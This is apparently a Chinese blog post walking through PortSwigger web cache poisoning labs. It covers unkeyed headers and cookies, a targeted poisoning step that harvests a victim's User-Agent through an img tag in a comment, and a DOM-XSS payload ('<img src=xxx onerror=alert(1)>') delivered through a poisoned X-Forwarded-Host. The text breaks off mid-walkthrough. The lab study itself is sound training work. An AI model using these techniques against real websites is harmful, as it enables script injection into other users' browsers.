@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <meta name="description" content="Web缓存投毒靶场" />
+    <meta name="hexo-theme-A4" content="v1.8.8" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>Hexo</title>
+
+    
+        
+<link rel="stylesheet" href="/css/highlight/style1.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+
+    
+        
+<link rel="stylesheet" href="/css/returnToLastPage.css">
+
+    
+    
+   
+<link rel="stylesheet" href="/css/lightgallery.min.css">
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .post-md pre, .post-md .highlight {
+            background: #212425;
+            color: white; 
+        }
+        pre .string, pre .value, pre .inheritance, pre .header, pre .ruby .symbol, pre .xml .cdata {
+            color: #000000;
+        }
+        pre .number, pre .preprocessor, pre .built_in, pre .literal, pre .params, pre .constant {
+            color: #000000;
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+        .return-to-last-progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .return-to-last-progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .return-to-last-progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+
+
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">Hexo</a> 
+            <span class="description"></span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            Web缓存投毒靶场
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E9%9D%9E%E7%BC%93%E5%AD%98%E9%94%AE%E6%A0%87%E5%A4%B4%E7%9A%84-Web-%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92"><span class="post-toc-text">非缓存键标头的 Web 缓存中毒</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E4%BD%BF%E7%94%A8%E9%9D%9E%E7%BC%93%E5%AD%98%E9%94%AE%E7%9A%84-cookie-%E9%80%A0%E6%88%90-Web-%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92"><span class="post-toc-text">使用非缓存键的 cookie 造成 Web 缓存中毒</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%85%B7%E6%9C%89%E5%A4%9A%E4%B8%AA%E6%A0%87%E5%A4%B4%E7%9A%84-Web-%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92"><span class="post-toc-text">具有多个标头的 Web 缓存中毒</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E4%BD%BF%E7%94%A8%E6%9C%AA%E7%9F%A5%E6%A0%87%E5%A4%B4%E8%BF%9B%E8%A1%8C%E6%9C%89%E9%92%88%E5%AF%B9%E6%80%A7%E7%9A%84-Web-%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92"><span class="post-toc-text">使用未知标头进行有针对性的 Web 缓存中毒</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Web-%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92%EF%BC%8C%E9%80%9A%E8%BF%87%E5%85%B7%E6%9C%89%E4%B8%A5%E6%A0%BC%E5%8F%AF%E7%BC%93%E5%AD%98%E6%80%A7%E6%A0%87%E5%87%86%E7%9A%84%E7%BC%93%E5%AD%98%E6%9D%A5%E5%88%A9%E7%94%A8-DOM-%E6%BC%8F%E6%B4%9E"><span class="post-toc-text">Web 缓存中毒，通过具有严格可缓存性标准的缓存来利用 DOM 漏洞</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E7%BB%93%E5%90%88-Web-%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E"><span class="post-toc-text">结合 Web 缓存中毒漏洞</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E9%80%9A%E8%BF%87%E9%9D%9E%E7%BC%93%E5%AD%98%E9%94%AE%E7%9A%84%E6%9F%A5%E8%AF%A2%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%A0%E6%88%90-Web-%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92"><span class="post-toc-text">通过非缓存键的查询字符串造成 Web 缓存中毒</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E9%80%9A%E8%BF%87%E9%9D%9E%E7%BC%93%E5%AD%98%E9%94%AE%E7%9A%84%E6%9F%A5%E8%AF%A2%E5%8F%82%E6%95%B0%E9%80%A0%E6%88%90-Web-%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92"><span class="post-toc-text">通过非缓存键的查询参数造成 Web 缓存中毒</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E9%9A%90%E8%97%8F%E5%8F%82%E6%95%B0"><span class="post-toc-text">隐藏参数</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E9%80%9A%E8%BF%87Fat-GET-%E8%AF%B7%E6%B1%82%E9%80%A0%E6%88%90-Web-%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92"><span class="post-toc-text">通过Fat GET 请求造成 Web 缓存中毒</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#URL-%E8%A7%84%E8%8C%83%E5%8C%96"><span class="post-toc-text">URL 规范化</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E7%BC%93%E5%AD%98%E5%AF%86%E9%92%A5%E6%B3%A8%E5%85%A5"><span class="post-toc-text">缓存密钥注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%86%85%E9%83%A8%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92"><span class="post-toc-text">内部缓存中毒</span></a></li></ol>
+            
+        
+        <link rel="stylesheet" type="text/css" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote>
+<p>靶场地址:<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs#web-cache-poisoning">https://portswigger.net/web-security/all-labs#web-cache-poisoning</a></p>
+</blockquote>
+<h2 id="非缓存键标头的-Web-缓存中毒"><a href="#非缓存键标头的-Web-缓存中毒" class="headerlink" title="非缓存键标头的 Web 缓存中毒"></a>非缓存键标头的 Web 缓存中毒</h2><blockquote>
+<p>该实验室容易受到<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-poisoning">网络缓存中毒的影响</a>，因为它以不安全的方式处理来自未加密标头的输入。毫无戒心的用户会定期访问该网站的主页。<code>alert(document.cookie)</code>要完成此实验，请使用在访问者浏览器中 执行的响应来毒害缓存。</p>
+<p>提示：本实验支持<code>X-Forwarded-Host</code>标头。</p>
+</blockquote>
+<p>首先使用bp插件param miner来查找缓存键</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310032103328.png" title="image-20231003210347230" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310032103328.png" alt="image-20231003210347230"></a></p>
+<p>发现<code>x-forwarded-host</code>会影响响应页面</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310032102488.png" title="image-20231003210245357" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310032102488.png" alt="image-20231003210245357"></a></p>
+<p>测试发现，访问带着这个头，会在请求的静态资源文件前面添加这个头的值</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310032106730.png" title="image-20231003210616603" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310032106730.png" alt="image-20231003210616603"></a></p>
+<p>然后再次访问，可以发现<code>X-Cache: hit</code>，则说明当前的响应来自缓存</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310032107007.png" title="image-20231003210731909" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310032107007.png" alt="image-20231003210731909"></a></p>
+<p>所以只需要让<code>x-forwarded-host</code>的值为攻击者的恶意地址，并存入缓存，就能劫持受害者在访问主页时候加载的静态资源</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310032121265.png" title="image-20231003212117191" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310032121265.png" alt="image-20231003212117191"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310032121136.png" title="image-20231003212109044" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310032121136.png" alt="image-20231003212109044"></a></p>
+<p>然后再次访问主页，可以发现就会弹窗</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310032121939.png" title="image-20231003212103866" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310032121939.png" alt="image-20231003212103866"></a></p>
+<h2 id="使用非缓存键的-cookie-造成-Web-缓存中毒"><a href="#使用非缓存键的-cookie-造成-Web-缓存中毒" class="headerlink" title="使用非缓存键的 cookie 造成 Web 缓存中毒"></a>使用非缓存键的 cookie 造成 Web 缓存中毒</h2><blockquote>
+<p>该实验很容易受到<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-poisoning">Web 缓存中毒的影响，</a>因为 cookie 不包含在缓存密钥中。毫无戒心的用户会定期访问该网站的主页。<code>alert(1)</code>要完成此实验，请使用在访问者浏览器中 执行的响应来毒害缓存。</p>
+</blockquote>
+<p>可以发现，响应页面里的值受请求的cookie的影响，且会被缓存</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310032128203.png" title="image-20231003212847112" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310032128203.png" alt="image-20231003212847112"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310032129019.png" title="image-20231003212947921" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310032129019.png" alt="image-20231003212947921"></a></p>
+<p>所以只需要构造一个xss即可，然后用intruder一直发包，直到被缓存</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310032136257.png" title="image-20231003213607171" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310032136257.png" alt="image-20231003213607171"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310032135172.png" title="image-20231003213556091" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310032135172.png" alt="image-20231003213556091"></a></p>
+<p>再访问页面会弹窗</p>
+<h2 id="具有多个标头的-Web-缓存中毒"><a href="#具有多个标头的-Web-缓存中毒" class="headerlink" title="具有多个标头的 Web 缓存中毒"></a>具有多个标头的 Web 缓存中毒</h2><blockquote>
+<p>此实验包含一个<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-poisoning">Web 缓存中毒</a>漏洞，仅当您使用多个标头来制作恶意请求时才可利用该漏洞。用户大约每分钟访问一次主页。<code>alert(document.cookie)</code>要完成此实验，请使用在访问者浏览器中 执行的响应来毒害缓存。</p>
+</blockquote>
+<p>首先用parma miner来fuzz一下哪些标头会对返回包造成影响</p>
+<p>可以发现，有两个标头会影响返回包</p>
+<p><code>x-forwarded-host</code>和<code>x-forwarded-scheme</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310042152843.png" title="image-20231004215241681" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310042152843.png" alt="image-20231004215241681"></a></p>
+<p>然后可以发现，当<code>x-forwarded-scheme</code>有值的时候，响应包就会302跳转到<code>X-Forwarded-Host</code>指定的域名，并且会被缓存</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310042153358.png" title="image-20231004215330271" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310042153358.png" alt="image-20231004215330271"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310042154847.png" title="image-20231004215419749" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310042154847.png" alt="image-20231004215419749"></a></p>
+<p>发现，网页会请求静态资源文件</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310042155119.png" title="image-20231004215518026" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310042155119.png" alt="image-20231004215518026"></a></p>
+<p>我们只要把请求这个资源的路径进行缓存投毒，让受害者请求这个资源的时候，是请求的我构造的缓存，这样就能劫持受害者请求的静态资源，从而造成弹窗</p>
+<p>我这里是把https取消掉才可以成功访问到exploit端的资源，但是后面测试，使用https也是可以的，不知道为什么</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310042202924.png" title="image-20231004220252851" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310042202924.png" alt="image-20231004220252851"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310042158013.png" title="image-20231004215808933" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310042158013.png" alt="image-20231004215808933"></a></p>
+<p>成功存入缓存，然后再访问主页，就会弹窗</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310042202806.png" title="image-20231004220219725" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310042202806.png" alt="image-20231004220219725"></a></p>
+<h2 id="使用未知标头进行有针对性的-Web-缓存中毒"><a href="#使用未知标头进行有针对性的-Web-缓存中毒" class="headerlink" title="使用未知标头进行有针对性的 Web 缓存中毒"></a>使用未知标头进行有针对性的 Web 缓存中毒</h2><blockquote>
+<p>该实验室容易受到<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-poisoning">网络缓存中毒的</a>影响。受害者用户将查看您发布的任何评论。<code>alert(document.cookie)</code>要完成此实验，您需要使用在访问者浏览器中执行的响应来毒害缓存。但是，您还需要确保将响应提供给目标受害者所属的特定用户子集。</p>
+</blockquote>
+<p>查看响应包可以知道，vary的值为<code>User-Agent</code>，<code>User-Agent</code>也就是服务器的缓存键</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310051916680.png" title="image-20231005191633511" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310051916680.png" alt="image-20231005191633511"></a></p>
+<p>然后使用<code>parma miner</code>来爆破是否存在隐藏标头</p>
+<p>找到了两个</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310051924233.png" title="image-20231005192445143" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310051924233.png" alt="image-20231005192445143"></a></p>
+<p>然后可以看到，<code>x-host</code>标头会影响页面请求静态资源的url路径，而且需要有origin标头的时候，才会造成影响</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310051929505.png" title="image-20231005192913406" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310051929505.png" alt="image-20231005192913406"></a></p>
+<p>所以还是对静态资源文件的访问进行缓存投毒，因为受害者会查看评论，所以对文章页面进行投毒</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310051934171.png" title="image-20231005193449094" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310051934171.png" alt="image-20231005193449094"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310051935567.png" title="image-20231005193527473" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310051935567.png" alt="image-20231005193527473"></a></p>
+<p>但是在日志里看不到受害者的访问，原因就是我们缓存进去的User-agent和受害者的不一样，所以得通过其他方式来获得受害者的user-agent</p>
+<p>在文章评论区可以发现，评论可以解析html，所以用img标签来获得受害者的user-agent头</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310051939448.png" title="image-20231005193926369" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310051939448.png" alt="image-20231005193926369"></a></p>
+<p>查看日志，可以得到受害者的user-agent</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310051940394.png" title="image-20231005194034307" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310051940394.png" alt="image-20231005194034307"></a></p>
+<p>然后用这个user-agent进行缓存投毒</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310051941842.png" title="image-20231005194108745" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310051941842.png" alt="image-20231005194108745"></a></p>
+<p>就可以让受害者访问当前页面的时候进行弹窗</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310051941076.png" title="image-20231005194158982" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310051941076.png" alt="image-20231005194158982"></a></p>
+<h2 id="Web-缓存中毒，通过具有严格可缓存性标准的缓存来利用-DOM-漏洞"><a href="#Web-缓存中毒，通过具有严格可缓存性标准的缓存来利用-DOM-漏洞" class="headerlink" title="Web 缓存中毒，通过具有严格可缓存性标准的缓存来利用 DOM 漏洞"></a>Web 缓存中毒，通过具有严格可缓存性标准的缓存来利用 DOM 漏洞</h2><blockquote>
+<p>该实验室包含一个基于 DOM 的漏洞，可被利用作为<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-poisoning">Web 缓存中毒</a>攻击的一部分。用户大约每分钟访问一次主页。请注意，本实验使用的缓存对于决定哪些响应可缓存有更严格的标准，因此您需要仔细研究缓存行为。</p>
+<p><code>alert(document.cookie)</code>要解决该实验室问题，请使用在访问者浏览器中 执行的响应来毒害缓存。</p>
+</blockquote>
+<p>点击一个商品页面，查看网络可以发现他其中的js文件会想一个url请求json数据，并进行dom操作</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">initGeoLocate</span>(<span class="params">jsonUrl</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_">fetch</span>(jsonUrl)</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">json</span>())</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">j</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> geoLocateContent = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;shipping-info&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">            img.<span class="title function_">setAttribute</span>(<span class="string">&quot;src&quot;</span>, <span class="string">&quot;/resources/images/localShipping.svg&quot;</span>);</span><br><span class="line">            geoLocateContent.<span class="title function_">appendChild</span>(img)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">            div.<span class="property">innerHTML</span> = <span class="string">&#x27;Free shipping to &#x27;</span> + j.<span class="property">country</span>;</span><br><span class="line">            geoLocateContent.<span class="title function_">appendChild</span>(div)</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310052010823.png" title="image-20231005201011726" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310052010823.png" alt="image-20231005201011726"></a></p>
+<p>在网页源代码可以看到调用这个函数的地方</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="title function_">initGeoLocate</span>(<span class="string">&#x27;//&#x27;</span> + data.<span class="property">host</span> + <span class="string">&#x27;/resources/json/geolocate.json&#x27;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310052011538.png" title="image-20231005201110474" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310052011538.png" alt="image-20231005201110474"></a></p>
+<p>data的值在这定义</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310052011551.png" title="image-20231005201151486" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310052011551.png" alt="image-20231005201151486"></a></p>
+<p>使用parma miner来查看是否有标头会对<code>data.host</code>的值造成影响</p>
+<p>找到了<code>x-forwarded-host</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310052014406.png" title="image-20231005201430316" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310052014406.png" alt="image-20231005201430316"></a></p>
+<p>发现这个确实会对host的值造成影，并且存入缓存</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310052015911.png" title="image-20231005201516803" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310052015911.png" alt="image-20231005201516803"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310052015737.png" title="image-20231005201547636" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310052015737.png" alt="image-20231005201547636"></a></p>
+<p>在插入输入的地方，只有<code>j.country</code>的值是我们可控的，使用下面的payload可以造成dom xss</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/div&gt;&lt;img src=xxx onerror=alert(1)&gt;X&lt;/</span>div&gt;&lt;div&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310052031131.png" title="image-20231005203132096" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310052031131.png" alt="image-20231005203132096"></a></p>
+<p>然后对json格式的数据进行伪造</p>
